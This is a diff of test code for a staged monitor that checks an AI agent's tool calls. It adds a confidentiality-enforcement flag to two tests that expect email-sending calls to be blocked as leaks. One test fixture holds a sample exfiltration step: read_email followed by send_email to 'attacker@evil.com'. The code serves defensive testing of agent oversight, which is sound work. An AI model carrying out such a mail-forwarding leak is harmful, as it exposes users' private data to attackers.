@@ -100,7 +100,7 @@ def test_a_leak_is_blocked_without_paying_for_stage_three():
     called = []
     result = check_calls(
         1, screened, [ToolCall("send_email", {"to": "someone@example.com"})],
-        escalate_fn=lambda calls: called.append(calls),
+        escalate_fn=lambda calls: called.append(calls), enforce_confidentiality=True,
     )
 
     assert result.trace.policy_verdict == "block"
@@ -116,6 +116,7 @@ def test_one_blockable_call_is_not_waved_through_by_safe_ones_beside_it():
     result = check_calls(
         1, screened,
         [ToolCall("read_email", {}), ToolCall("send_email", {"to": "attacker@evil.com"})],
+        enforce_confidentiality=True,
     )
 
     assert result.trace.policy_verdict == "block"
